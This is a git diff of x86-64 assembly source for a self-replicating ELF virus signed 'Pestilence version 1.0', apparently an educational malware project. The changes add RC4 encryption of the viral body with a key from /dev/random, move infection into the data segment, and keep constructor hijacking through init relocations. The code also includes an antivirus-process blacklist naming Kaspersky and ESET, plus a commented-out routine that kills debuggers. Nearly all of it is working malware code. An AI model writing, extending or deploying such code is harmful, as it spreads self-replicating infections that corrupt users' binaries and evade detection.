@@ -6,12 +6,13 @@ virus_lenq equ virus_len / 8
 virus_lenb equ virus_len % 8
 
 section .text
-    global _start
+    global _start_first_time
+
+_start_first_time:
+    push    _end
 
 ; [rsp]     cwd_fd
 _start:
-    push    rbx
-    push    r12
     push    rbp
     mov     rbp, rsp
     sub     rsp, 0x10
@@ -35,9 +36,7 @@ _start:
     add     eax, SYS_CLOSE
     syscall
     leave
-    pop     r12
-    pop     rbx
-    jmp     _end - 5
+    ret
 
 ; [rsp]         fd
 ; [rsp + 0x4]   buf_len
@@ -98,10 +97,32 @@ end_readdir:
     mov     edi, [rsp]
     xor     eax, eax
     add     eax, SYS_CLOSE
+    syscall
     mov     rdi, [rsp + 0x8]
     mov     rsi, 0x1000
     mov     eax, SYS_MUNMAP
     syscall
+    leave
+    ret
+
+generate_key:
+    push    rbp
+    mov     rbp, rsp
+    push    rdi
+    lea     rdi, [rel key_file]
+    xor     rsi, rsi ; O_RDONLY
+    mov     eax, SYS_OPEN
+    syscall
+    cmp     eax, 0
+    jl      _end
+    push    rax
+    mov     rdi, rax
+    lea     rsi, [rel key]
+    mov     rdx, key_len
+    mov     eax, SYS_READ
+    syscall
+    pop     rdi
+    mov     eax, SYS_CLOSE
     syscall
     leave
     ret
@@ -261,20 +282,23 @@ check_process:
     call    test_forbidden_program
     jmp     munmap_quit_check_process
 test_debugger:
-    mov     rdi, [rsp]
-    lea     rsi, [rel tpid_str]
-    call    strstr
-    mov     rdi, rax
-    call    atoi
-    jmp     fkjmp_debug_test
-    db 0x74
-fkjmp_debug_test:
-    test    eax, eax
-    jz      munmap_quit_check_process
-    mov     edi, eax
-    mov     esi, SIGKILL
-    mov     eax, SYS_KILL
-    syscall
+;     mov     rdi, [rsp]
+;     lea     rsi, [rel tpid_str]
+;     call    strstr
+;     mov     rdi, rax
+;     call    atoi
+;     jmp     fkjmp_debug_test
+;     db 0x74
+; fkjmp_debug_test:
+;     test    eax, eax
+;     jz      munmap_quit_check_process
+;     mov     edi, eax
+;     mov     esi, SIGKILL
+;     mov     eax, SYS_KILL
+;     jmp     fkjmp_debug_test2
+;     db 0xe9
+; fkjmp_debug_test2:
+;     syscall
 munmap_quit_check_process:
     mov     rdi, rax
     mov     rsi, 0x1000
@@ -292,19 +316,13 @@ loop_program_blacklist:
     repz    cmpsb
     mov     al, BYTE [rdi - 1]
     test    al, al
-    jz      quit_virus
+    jz      _end
     xor     al, al
     repnz   scasb
     mov     al, BYTE [rdi]
     test    al, al
     jnz     loop_program_blacklist
     ret
-
-quit_virus:
-    xor     edi, edi
-    add     edi, 42
-    mov     eax, SYS_EXIT
-    syscall
 
 strncmp:
     mov     rcx, rdx
@@ -506,7 +524,7 @@ test_rela:
     je      get_init_rela
 next_section:
     loop    test_last_text
-    jmp     check_text_padding
+    jmp     remap_and_infect_data
 
 get_init_rela:
     mov     r8, [rsp + map]
@@ -532,43 +550,6 @@ found_init_rela:
     sub     QWORD [rsp + init_rela_entry_off], rbx
     jmp     next_section
 
-check_text_padding:
-    mov     r8, [rsp + map]
-    mov     r9, r8
-    add     r9w, WORD [r8 + e_phentsize]
-    add     r8, [rsp + text_phdr_off]
-    add     r9, [rsp + text_phdr_off]
-    mov     rbx, [r8 + p_offset]
-    add     rbx, [r8 + p_filesz]
-    mov     rax, [r9 + p_offset]
-    sub     rax, rbx
-    cmp     rax, virus_len
-    jle     remap_and_infect_data
-
-    mov     rax, r8
-    mov     rdi, [rax + p_offset]
-    add     rdi, [rax + p_filesz]
-    mov     rsi, [rax + p_vaddr]
-    add     rsi, [rax + p_memsz]
-    mov     [rsp + payload_base_address], rsi
-    mov     [rsp + payload_base_offset], rdi
-    add     rdi, [rsp + map]
-    lea     rsi, [rel _start]
-    mov     rcx, virus_lenq
-    call    copy_payload
-
-increase_text_size:
-    mov     rax, [rsp + text_phdr_off]
-    add     rax, [rsp + map]
-    add     QWORD [rax + p_filesz], virus_len
-    add     QWORD [rax + p_memsz], virus_len
-    mov     rax, [rsp + map]
-    add     rax, [rsp + last_text_shdr_off]
-    add     QWORD [rax + sh_size], virus_len
-    mov     rdi, [rsp + payload_base_offset]
-    mov     rsi, [rsp + payload_base_address]
-    jmp     hijack_constructor
-
 remap_and_infect_data:
     cmp     rax, payload_mprotect_len
     jle     munmap_quit_infect
@@ -592,8 +573,8 @@ remap_and_infect_data:
     add     r10b, MREMAP_MAYMOVE
     mov     eax, SYS_MREMAP
     syscall
-    cmp     rax, 0xffffffffffffff00
-    ja      munmap_quit_infect
+    test    al, al
+    jnz     munmap_quit_infect
     mov     [rsp + map], rax
 
 shift_end_of_file:
@@ -678,6 +659,15 @@ copy_virus_in_data:
     sub     rdx, r12
     mov     [rsp + payload_data_base_address], rdx
 
+crypt_virus:
+    call    generate_key
+    mov     rdi, [rsp + map]
+    add     rdi, [rsp + payload_data_base_offset]
+    mov     rsi, virus_len
+    push    rdx
+    call    rc4
+    pop     rdx
+
 format_text_code_chunk:
     mov     rbx, [rsp + map]
     add     rbx, [rsp + data_phdr_off]
@@ -689,14 +679,14 @@ format_text_code_chunk:
     sub     r8, rdx
     mov     rcx, [rbx + p_filesz]
     add     rcx, rdx
-    mov     [data_len], rcx
+    mov     [rel data_len], rcx
     mov     rbx, [rsp + map]
     add     rbx, [rsp + text_phdr_off]
     mov     rax, [rbx + p_vaddr]
     add     rax, [rbx + p_memsz]
     mov     [rsp + payload_base_address], rax
     sub     r8, rax
-    mov     [data_addr_offset], r8
+    mov     [rel data_addr_offset], r8
 
     lea     rsi, [rel payload_mprotect]
     mov     rax, [rsp + map]
@@ -721,8 +711,8 @@ copy_text_code_chunk:
 
     mov     rdx, [rsp + new_file_size]
     mov     [rsp + file_size], rdx
-    mov     rdi, [rsp + payload_data_base_offset]
-    mov     rsi, [rsp + payload_data_base_address]
+    mov     rdi, [rsp + payload_base_offset]
+    mov     rsi, [rsp + payload_base_address]
 
 ; rdi       payload_base_offset
 ; rsi       payload_base_address
@@ -737,9 +727,9 @@ hijack_constructor:
     add     r11, [rsp + init_rela_entry_off]
     mov     [r11 + r_addend], rdx
     add     rdi, [rsp + map]
-    add     rdi, virus_len - 4
+    add     rdi, final_jump_offset_text
     mov     rdx, [rsp + old_init_func]
-    add     rsi, virus_len
+    add     rsi, final_jump_offset_text + 4
     sub     rdx, rsi
     mov     DWORD [rdi], edx
 
@@ -777,6 +767,8 @@ end_copy:
     ret
 
 payload_mprotect:
+    push    rbx
+    push    r12
     lea     rdi, [rel payload_mprotect]
     add     rdi, [rel data_addr_offset]
     mov     rsi, [rel data_len]
@@ -784,11 +776,111 @@ payload_mprotect:
     xor     rax, rax
     add     rax, SYS_MPROTECT
     syscall
+    lea     rdi, [rel payload_mprotect]
+    add     rdi, [rel data_addr_offset]
+    add     rdi, [rel data_len]
+    sub     rdi, virus_len
+    mov     rsi, virus_len
+    call    rc4
     lea     rax, [rel payload_mprotect]
     add     rax, [rel data_addr_offset]
     add     rax, [rel data_len]
     sub     rax, virus_len
-    jmp     rax
+    call    rax
+    pop     r12
+    pop     rbx
+    final_jump_opcode: db 0xe9
+    final_jump: dd _end - $ - 4
+    final_jump_offset equ final_jump - _start
+    final_jump_offset_text equ final_jump - payload_mprotect
+
+; rdi       crypt_pointer
+; rsi       crypt_len
+rc4:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x120
+    sub     rsp, rsi
+    mov     [rsp], rdi
+    mov     [rsp + 0x8], rsi
+    mov     rcx, 0x100
+    xor     al, al
+    lea     rdi, [rsp + 0x10]
+loop_init_vector:
+    stosb
+    inc al
+    loop    loop_init_vector
+
+    xor     r8, r8
+    xor     r9, r9
+    lea     rdi, [rel key]
+    lea     rsi, [rsp + 0x10]
+    mov     cx, 0x100
+rc4_init_loop:
+    mov     rax, r8
+    and     rax, 0x1f ; rax % key_len
+    add     rax, rdi
+    movzx   rdx, BYTE [rax]
+    mov     rbx, r8
+    add     rbx, rsi
+    movzx   r10, BYTE [rbx]
+    add     r9, r10
+    add     r9, rdx
+    movzx   r9, r9b
+    mov     rax, r9
+    add     rax, rsi
+    mov     dl, BYTE [rax]
+    mov     BYTE [rax], r10b
+    mov     BYTE [rbx], dl
+    inc     r8
+    loop    rc4_init_loop
+
+rc4_crypt:
+    mov     rcx, [rsp + 0x8]
+    lea     rdi, [rsp + 0x110]
+    mov     rsi, [rsp]
+    lea     r10, [rsp + 0x10]
+    xor     r8, r8
+    xor     r9, r9
+
+rc4_crypt_loop:
+    inc     r8
+    movzx   r8, r8b
+    mov     r11, r10
+    add     r11, r8
+    add     r9b, [r11]
+    movzx   r9, r9b
+    mov     r12, r10
+    add     r12, r9
+    mov     dl, [r12]
+    mov     bl, [r11]
+    mov     [r12], bl
+    mov     [r11], dl
+    mov     dl, [r11]
+    add     dl, [r12]
+    movzx   rdx, dl
+    add     rdx, r10
+    mov     al, [rdx]
+    xor     al, BYTE [rsi]
+    mov     BYTE [rdi], al
+    inc     rdi
+    inc     rsi
+    loop    rc4_crypt_loop
+
+    mov     rdi, [rsp]
+    lea     rsi, [rsp + 0x110]
+    mov     rcx, [rsp + 0x8]
+copy_crypted_mem:
+    lodsb
+    stosb
+    loop    copy_crypted_mem
+
+    leave
+    ret
+
+    key_len equ 32
+    key: TIMES key_len db 0
+    signature: db "Pestilence version 1.0 (c)oded by alagroy-", 0
     data_len: dq 0
     data_addr_offset: dq 0
 
@@ -798,13 +890,11 @@ payload_mprotect:
     proc_dir: db "/proc/", 0
     status_file: db "/status", 0
     self_str: db "self", 0
+    key_file: db "/dev/random", 0
     tpid_str: db "TracerPid:", 9, 0
         .len: equ $ - tpid_str
     cwd: db ".", 0
     program_blacklist: db "test", 0, "kaspersky", 0, "ESET", 0, 0
-    signature: db "Pestilence version 1.0 (c)oded by alagroy-", 0
-    ; TIMES 0x4000 db 0 ; To trigger data infection for testing, will be removed eventuelly
-    final_jump: db 0xe9, 0, 0, 0, 0
 
 _end:
     xor     rdi, rdi
